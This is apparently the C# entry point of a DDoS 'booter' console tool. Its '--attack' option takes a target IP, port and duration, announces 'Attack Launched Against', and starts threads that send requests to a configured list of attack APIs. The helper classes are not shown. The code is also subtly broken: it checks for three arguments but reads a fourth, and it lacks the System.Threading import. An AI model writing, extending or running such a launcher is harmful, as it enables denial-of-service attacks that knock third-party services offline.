using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Console_Booter.API;
namespace Console_Booter
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                ConsoleShort.WriteLine("Welcome to " + Config.BooterName, ConsoleColor.Cyan);
                ConsoleShort.Space();
                if (!(AsArgs(args)))
                {
                    ConsoleShort.WriteLine("Write -h or --help, to list all commands available", ConsoleColor.DarkCyan);
                }
                else
                {
                    if (args[0] == "-h" || args[0] == "--help")
                    {
                        for (int i = 0; i < Config.HelpText.Length; i++)
                        {
                            ConsoleShort.WriteLine(Config.HelpText[i], ConsoleColor.DarkRed);
                        }
                    }
                    if (args[0] == "-atk" || args[0] == "--attack")
                    {
                        if (!(args.Length < 3))
                        {
                            string ipTarget = args[1];
                            string portTarget = args[2];
                            string timeTarget = args[3];
                            ConsoleShort.WriteLine("Attack Launched Against " + String.Format("Host: {0} Port: {1} Time: {2}", ipTarget, portTarget, timeTarget), ConsoleColor.Green);
                            for (int i = 0; i < Config.APIs.Length; i++)
                            {
                                string api = Config.APIs[i];
                                Thread thread = new Thread(() => WorkThread(api));
                                thread.Start();
                                //Functions.MakeRequest(Config.APIs[i], false); -
                            }
                        }
                        else
                        {
                            ConsoleShort.WriteLine("The syntax of the command is incorrect", ConsoleColor.Red);
                        }
                    }
                    if (args[0] == "-c" || args[0] == "--credits")
                    {
                        for (int i = 0; i < Config.InfoAbout.Length; i++)
                        {
                            ConsoleShort.WriteLine(Config.InfoAbout[i], ConsoleColor.Green);
                        }
                    }
                }

                ConsoleShort.Pause();
            }
            catch(Exception ex)
            {
                ConsoleShort.WriteLine("An error has occurred:  " + ex.InnerException, ConsoleColor.Red);
            }
        }
         static void WorkThread(string apis)
        {
            Functions.MakeRequest(apis, false);
        }
         static Boolean AsArgs(string[] getArg)
         {
             try
             {
                 if (getArg[0] == "")
                 {
                 }
                 return true;
             }
             catch
             {
                 return false;
             }
         }
    }
}
